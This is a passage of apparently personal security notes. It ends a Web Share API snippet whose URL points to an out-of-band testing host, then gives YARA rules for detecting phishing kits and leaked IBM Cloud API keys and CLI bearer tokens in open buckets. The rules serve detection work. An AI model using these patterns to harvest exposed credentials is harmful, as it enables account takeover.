        url: 'https://d016rj6kuj25cl9fe7l0bykqdyuotcn98.oast.online',
      };
      const btn = document.querySelector('button');
      const resultPara = document.querySelector('.result');
      btn.addEventListener('click', () => {
        if (!navigator.canShare) {
          resultPara.textContent = 'Web Share API not available';
          return;
        }
        if (!navigator.canShare(shareData)) {
          resultPara.textContent = 'Share data unsupported, disallowed, or invalid';
          return;
        }
```


## Detection

### phishing kits yara rule 
(found inside open buckets)

```
rule phishingKits3 {
   meta:
      description = "PhishingKits3"
      author = "ferasdour"
   strings:
      $s1 = "https://ajax.googleapis.com/ajax/libs/jquery/" ascii
      $s2 = "https://code.jquery.com/jquery-" ascii
      $s3 = "window.location.hash.substr(" ascii
      $s4 = ".substr((" ascii
      $s5 = ").click(function(event" ascii
      $s6 = "Please try again later" ascii
      $r1 = /url:(\s)\Shttps:\/\/.[a-zA-Z0-9-_.]{6,200}/is
      $r2 = /type:(\s|\s')POST',/is
      $s7 = "email:" ascii
      $s8 = "password:" ascii
      $s9 = "btn').html('" ascii
//      $header = { (0d 0a | 20 0d 0a 0d 0a | 3c 21 44) }
   condition:
       any of ($*)
}
```

### IBM Cloud API key yara rule 
(finds some false positives, but substantially less than any other method I've found)

```
rule cloudApiKeyRule
{
    meta:
        name = "ibmcloud key"
        author = "ferasdour"
        notes = "just used grep -Praho with these set together with or operator"
    strings:
        $ibmApiKey = /\"[A-Za-z0-9]{5,25}\d[A-Za-z0-9]{5,20}[\_][A-Za-z0-9]{5,25}\"/
        $ibmApiKey2 = /(\s[A-Za-z0-9]{5,25}\d[A-Za-z0-9]{5,20}[\_][A-Za-z0-9]{5,25})/
        $ibmApiKey3 = /([A-Za-z0-9]{5,25}\d[A-Za-z0-9]{5,20}[\_][A-Za-z0-9]{5,25})/
    condition:
        // I have keys that are both 44 and 63 chars, truffle detects the 44 char, and terraform says its 63 limit, so lets just assume both. 46 to accomodate the quoted version
        ($ibmApiKey and (!ibmApiKey == 46 or !ibmApiKey == 64)) or
        ($ibmApiKey2 and (!ibmApiKey2 == 44 or !ibmApiKey2 == 63)) or
        // adding this one as a "with nothing added or surrounding the detection" for binary cases, comment out if not needed.
        ($ibmApiKey3 and (!ibmApiKey3 == 44 or !ibmApiKey3 == 63))
}
```

### IBMCloud cli config file
```
rule ibmcloudconfig: CLOUD_CONFIG_FILE {
   meta:
      description = "Search specifically for bearer token left in file from ibmcloud cli, including plugins"
      author = "ferasdour"
   strings:
      $s1 = "IAMToken"
      $s2 = "IAMRefreshToken"
      $s3 = "cloud.ibm.com"
      $h1 = { 7b 0a 20 20 }
   condition:
      $h1 at 0 and
      all of ($s1, $s2, $s3)
```

